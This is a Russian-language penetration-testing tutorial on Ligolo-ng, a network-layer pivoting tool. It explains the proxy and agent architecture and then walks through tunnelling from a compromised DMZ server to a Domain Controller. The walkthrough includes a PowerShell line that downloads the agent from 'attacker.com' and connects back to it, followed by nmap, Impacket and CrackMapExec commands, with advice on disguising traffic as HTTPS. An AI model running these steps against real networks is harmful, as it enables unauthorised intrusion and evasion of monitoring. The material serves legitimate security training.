# Ligolo-ng: Архитектура, принципы работы и применение в горизонтальном перемещении

## Контекст и базовые понятия: Эволюция методов обхода сетевых сегментов

Горизонтальное перемещение (Lateral Movement) в рамках тестирования на проникновение требует преодоления сетевых барьеров, таких как межсетевые экраны (Firewall), сегментация VLAN и отсутствие прямых маршрутов между подсетями. Исторически для решения этой задачи использовались методы проксирования на уровне транспортного протокола (Layer 4), в первую очередь SOCKS-прокси. Однако Ligolo-ng представляет собой переход к модели туннелирования на сетевом уровне (Layer 3), что фундаментально меняет подход к работе с compromised-хостами.

Ligolo-ng — это инструмент для туннелирования и перенаправления трафика (pivoting), который использует обратное TCP/TLS-соединение для создания виртуального сетевого интерфейса (TUN) на машине атакующего. В отличие от SOCKS-прокси, который работает как приложение и требует от каждого инструмента поддержки протокола SOCKS (или использования таких утилит, как proxychains, добавляющих оверхед и сложность конфигурации), Ligolo-ng эмулирует полноценный VPN-канал. Трафик, направляемый в этот интерфейс, инкапсулируется в TLS-соединение, передается через агент на скомпрометированной машине и оттуда отправляется в целевую сеть.

Ключевое разграничение заключается в уровне абстракции и механизме маршрутизации. SOCKS-прокси оперирует пакетами TCP/UDP, требуя от клиента явного указания прокси. Ligolo-ng оперирует IP-пакетами, позволяя операционной системе маршрутизировать трафик через виртуальный интерфейс так, как если бы он шел по физическому сетевому кабелю. Это позволяет использовать любые стандартные сетевые утилиты (Nmap, Impacket, RDP, SSH) без какой-либо модификации их конфигурации.

| Характеристика | SOCKS-прокси (Chisel, Proxifier) | Ligolo-ng (TUN-интерфейс) |
| :--- | :--- | :--- |
| **Уровень OSI** | Layer 4 (Транспортный) | Layer 3 (Сетевой) |
| **Механизм работы** | Приложение-прокси, перенаправление потоков | Виртуальный сетевой интерфейс (TUN/TAP) |
| **Требования к клиенту** | Поддержка SOCKS или использование proxychains | Стандартный сетевой стек ОС |
| **Поддержка UDP** | Требует отдельной настройки или не поддерживается | Поддерживается нативно через туннель |
| **Сложность маршрутизации** | Низкая (указать прокси в конфиге) | Средняя (настройка таблиц маршрутизации ОС) |
| **Обход ограничений** | Легко блокируется по IP/порту прокси | Трафик выглядит как HTTPS/WSS, сложнее детектировать |
| **Оверхед** | Высокий (при использовании proxychains) | Низкий (прямая маршрутизация ядром) |

Путаница между Ligolo-ng и его предшественником Ligolo часто возникает из-за схожести названий. Ligolo (оригинальная версия) использовал TAP-интерфейс (Layer 2), что требовало настройки мостов (bridging) и работы с MAC-адресами, что было сложно в облачных средах и при наличии NAT. Ligolo-ng переписан с использованием TUN-интерфейса (Layer 3) и библиотеки gVisor для создания пользовательского сетевого стека, что значительно упрощает развертывание и повышает производительность.

## Внутреннее устройство Ligolo-ng: Архитектура и компоненты

Архитектура Ligolo-ng состоит из двух основных бинарных файлов: `proxy` (серверная часть, запускается на машине атакующего) и `agent` (клиентская часть, запускается на скомпрометированной цели). Оба компонента написаны на языке Go, что обеспечивает кроссплатформенность и отсутствие внешних зависимостей (statically linked binaries).

### Компонент Proxy (Relay Server)

Proxy выступает в роли центра управления туннелями. Его основные функции:
1.  **Управление соединениями:** Принимает входящие подключения от агентов по протоколу WebSocket (WSS) поверх TLS.
2.  **Мультиплексирование:** Поддерживает одновременное обслуживание множества агентов через одно соединение.
3.  **Управление интерфейсами:** Создает и управляет виртуальными TUN-интерфейсами на стороне атакующего.
4.  **Маршрутизация:** Перенаправляет IP-пакеты из TUN-интерфейса в соответствующее соединение с агентом и обратно.

Proxy поддерживает несколько режимов аутентификации и конфигурации TLS:
*   **Self-signed certificates:** Автоматическая генерация самоподписанных сертификатов при запуске (`-selfcert`).
*   **Let's Encrypt:** Автоматическое получение валидных сертификатов через ACME-протокол (`-autocert`), что позволяет маскировать трафик под легитимный HTTPS-трафик.
*   **Custom certificates:** Использование пользовательских сертификатов и ключей.

### Компонент Agent

Agent запускается на скомпрометированной машине. Его задачи:
1.  **Инициализация соединения:** Устанавливает обратное TCP/WSS-соединение с Proxy.
2.  **Сетевой стек:** Использует библиотеку gVisor для создания изолированного пользовательского сетевого стека. Это позволяет агенту обрабатывать IP-пакеты без необходимости прав root/admin на целевой машине (хотя для некоторых функций, таких как прослушивание портов, права могут потребоваться).
3.  **Управление туннелями:** Получает команды от Proxy на создание маршрутов и перенаправление трафика.

### Взаимодействие и потоки данных

Процесс установки туннеля включает несколько фаз:
1.  **Handshake:** Agent подключается к Proxy, проходит TLS-аутентификацию (проверка отпечатка сертификата).
2.  **Session Creation:** Proxy создает новую сессию для агента и виртуальный TUN-интерфейс на стороне атакующего.
3.  **Route Advertisement:** Agent сообщает Proxy о доступных сетях (через команду `interface_add_route`).
4.  **Tunnel Start:** Proxy активирует маршрутизацию для указанных сетей через TUN-интерфейс.

```text
[Attacker Machine]                          [Compromised Host]
      |                                             |
      |  [TUN Interface: ligolo]                   |
      |  (IP: 240.0.0.1)                           |
      |                                             |
      |  <--- IP Packets (Layer 3) ---             |
      |                                             |
      |  [Ligolo-ng Proxy]                         |
      |  (TLS/WSS Listener)                        |
      |                                             |
      |  <--- Encrypted Stream (TCP/WS) --->       |
      |                                             |
      |                          [Ligolo-ng Agent] |
      |                          (gVisor Stack)    |
      |                                             |
      |                          <--- IP Packets --->|
      |                                             |
      |                                             |
      +---------------------------------------------+
                   Target Network Segment
```

### Особенности реализации

*   **gVisor:** Использование gVisor позволяет агенту работать в пользовательском пространстве, не требуя драйверов ядра на целевой машине. Это снижает вероятность обнаружения антивирусами, которые мониторят загрузку драйверов.
*   **Multiplexing:** Все данные от агента передаются через единый WebSocket-канал. Это упрощает обход файрволов, так как трафик выглядит как одно легитимное HTTPS-соединение.
*   **Auto-bind:** В версии 0.8+ добавлена функция автоматической привязки маршрутов при подключении агента, что ускоряет процесс развертывания.

## Применение и работа с Ligolo-ng: Практические аспекты развертывания

Работа с Ligolo-ng требует понимания как сетевой маршрутизации, так и особенностей настройки TLS. Ниже описаны ключевые этапы и команды.

### Настройка Proxy

На машине атакующего (например, Kali Linux) необходимо запустить Proxy. Для тестовых сред часто используется режим самоподписанных сертификатов.

```bash
# Запуск proxy с генерацией самоподписанных сертификатов
# -laddr: адрес и порт прослушивания (по умолчанию 0.0.0.0:11601)
# -selfcert: автоматическая генерация сертификатов
./ligolo-ng-proxy -selfcert

# Альтернатива: использование Let's Encrypt для маскировки под HTTPS
# Требует доступа к порту 80 для верификации домена
./ligolo-ng-proxy -autocert -laddr https://0.0.0.0:443
```

После запуска Proxy создает TUN-интерфейс. В Linux это делается автоматически, если запущен от root. В других ОС может потребоваться ручное создание интерфейса:

```bash
# Ручное создание TUN-интерфейса (если авто-создание не сработало)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
```

### Развертывание Agent

Agent загружается на цель и запускается с указанием адреса Proxy.

```bash
# Запуск agent на цели
# -connect: адрес Proxy
# -ignore-cert: игнорирование проверки сертификата (для самоподписанных)
# -reconnect: автоматическое переподключение
./ligolo-ng-agent -connect 192.168.1.100:11601 -ignore-cert -reconnect
```

### Управление туннелями в CLI Proxy

После подключения агента, оператор работает с ним через интерактивный shell Proxy.

```bash
# Подключение к proxy shell
./ligolo-ng-proxy

# В shell proxy:
# 1. Выбор активного агента
session <agent_id>

# 2. Просмотр доступных интерфейсов агента
ifconfig

# 3. Добавление маршрута в сеть агента
# --name: имя агента
# --route: сеть, которую нужно маршрутизировать
interface_add_route --name <agent_name> --route 10.10.14.0/24

# 4. Запуск туннеля для указанного маршрута
tunnel_start --tun <agent_name>

# 5. Проверка статуса туннеля
tunnel_status
```

### Настройка маршрутизации на стороне атакующего

После запуска туннеля, трафик, предназначенный для сети агента, должен быть направлен в TUN-интерфейс. Ligolo-ng обычно делает это автоматически, но в некоторых случаях требуется ручная настройка.

```bash
# Добавление статического маршрута в Linux
sudo ip route add 10.10.14.0/24 dev ligolo

# Проверка маршрутов
ip route show
```

### Типичные ошибки и подводные камни

1.  **Firewall на цели:** Агент требует исходящего подключения на порт Proxy. Если фаервол блокирует исходящий трафик на нестандартные порты, туннель не установится. Использование портов 80/443 и режима `-autocert` помогает обойти это.
2.  **Маршрутизация на цели:** Агент не маршрутизирует трафик автоматически. Оператор должен явно указать, какие сети доступны через агента, используя `interface_add_route`.
3.  **Конфликт IP-адресов:** Если IP-адреса в целевой сети совпадают с адресами в сети атакующего, возникнут конфликты маршрутизации.
4.  **UDP-трафик:** Хотя Ligolo-ng поддерживает UDP, некоторые сетевые устройства могут блокировать UDP-пакеты в туннеле.

## Сквозной практический пример: Переход через сегментированную сеть Active Directory

**Исходные условия:**
*   **Среда:** Корпоративная сеть с двумя сегментами: `192.168.10.0/24` (DMZ, где находится скомпрометированный веб-сервер) и `10.10.0.0/24` (Internal, где находится Domain Controller).
*   **Инструменты:** Kali Linux (Attacker), Ligolo-ng v0.8.
*   **Роль:** Пентестер, имеющий RCE на веб-сервере в DMZ.
*   **Цель:** Получить доступ к Domain Controller в сегменте `10.10.0.0/24` через веб-сервер.

### Шаг 1: Развертывание Proxy на машине атакующего

Атакующий запускает Ligolo-ng Proxy с использованием Let's Encrypt для маскировки трафика под HTTPS. Это позволяет обойти базовые правила файрвола, разрешающие исходящий HTTPS-трафик.

```bash
# На Kali Linux
sudo ./ligolo-ng-proxy -autocert -laddr https://0.0.0.0:443
```

*Ожидаемый результат:* Proxy запускается, запрашивает сертификат у Let's Encrypt для домена (или использует временный), начинает прослушивание на порту 443.

### Шаг 2: Запуск Agent на скомпрометированном веб-сервере

Атакующий загружает бинарный файл `ligolo-ng-agent` на веб-сервер в DMZ и запускает его.

```powershell
# На Windows Server в DMZ (PowerShell)
# Загрузка агента
Invoke-WebRequest -Uri "https://attacker.com/ligolo-ng-agent.exe" -OutFile "C:\temp\ligolo.exe"

# Запуск агента с подключением к Proxy
.\ligolo.exe -connect "attacker.com:443" -ignore-cert
```

*Ожидаемый результат:* Агент подключается к Proxy. В логе Proxy появляется сообщение о новом подключенном агенте.

### Шаг 3: Конфигурация туннеля в Proxy Shell

Атакующий переключается в shell Proxy, выбирает агент и добавляет маршрут к внутренней сети.

```bash
# В shell Proxy на Kali
# 1. Список активных сессий
sessions

# 2. Выбор сессии (предположим, ID сессии 1)
session 1

# 3. Просмотр интерфейсов агента для определения доступных сетей
ifconfig
# Вывод:
# Interface 1: eth0 (192.168.10.5/24)
# Interface 2: lo (127.0.0.1/8)

# 4. Добавление маршрута к внутренней сети 10.10.0.0/24
# Предполагается, что веб-сервер имеет доступ к этой сети
interface_add_route --name "webserver-dmz" --route 10.10.0.0/24

# 5. Запуск туннеля
tunnel_start --tun "webserver-dmz"
```

*Ожидаемый результат:* Ligolo-ng создает TUN-интерфейс на Kali и настраивает маршрутизацию. Трафик, направленный на `10.10.0.0/24`, теперь будет идти через туннель.

### Шаг 4: Проверка доступности и сканирование

Атакующий проверяет доступность Domain Controller в внутренней сети.

```bash
# На Kali Linux
# Проверка пинга через туннель
ping -c 4 10.10.0.1

# Сканирование портов через туннель (без proxychains)
nmap -sT -p 445,3389,88 10.10.0.1
```

*Ожидаемый результат:* Пинг успешен. Nmap показывает открытые порты (например, SMB 445, Kerberos 88), подтверждая, что туннель работает и трафик достигает внутренней сети.

### Шаг 5: Использование инструментов пост-эксплуатации

Теперь атакующий может использовать стандартные инструменты для горизонтального перемещения.

```bash
# Использование Impacket для сбора информации о домене
python3 /usr/share/doc/python3-impacket/examples/samrdump.py 10.10.0.1

# Использование CrackMapExec для поиска уязвимостей
crackmapexec smb 10.10.0.0/24
```

*Ожидаемый результат:* Инструменты успешно подключаются к хостам в внутренней сети, так как трафик маршрутизируется через TUN-интерфейс Ligolo-ng.

**Ожидаемый вывод:**
Пример демонстрирует, как Ligolo-ng позволяет преодолеть сегментацию сети без использования SOCKS-прокси. Трафик маскируется под HTTPS, что снижает вероятность обнаружения. Атакующий получает полноценный сетевой доступ к внутренней инфраструктуре, что позволяет использовать любые стандартные инструменты для дальнейшей эксплуатации.

## Аналитический вывод

Ligolo-ng представляет собой значительный шаг вперед в инструментах для горизонтального перемещения благодаря переходу от проксирования на уровне транспортного протокола к туннелированию на сетевом уровне. Использование TUN-интерфейса и библиотеки gVisor позволяет эмулировать VPN-соединение, что устраняет необходимость в поддержке SOCKS клиентами и упрощает маршрутизацию трафика. Это делает Ligolo-ng особенно эффективным в средах с жесткой сегментацией, где традиционные методы проксирования могут быть заблокированы или неудобны в использовании.

Однако использование Ligolo-ng требует понимания принципов работы сетевой маршрутизации и настройки TLS. Оператор должен правильно конфигурировать маршруты как на стороне агента, так и на стороне прокси, а также учитывать особенности работы с сертификатами. Для защитников Ligolo-ng представляет сложность в детектировании из-за использования легитимных протоколов (HTTPS/WSS) и отсутствия характерных сигнатур в трафике. Эффективное обнаружение требует применения поведенческого анализа и мониторинга аномалий в сетевом трафике, а не только сигнатурного сканирования.
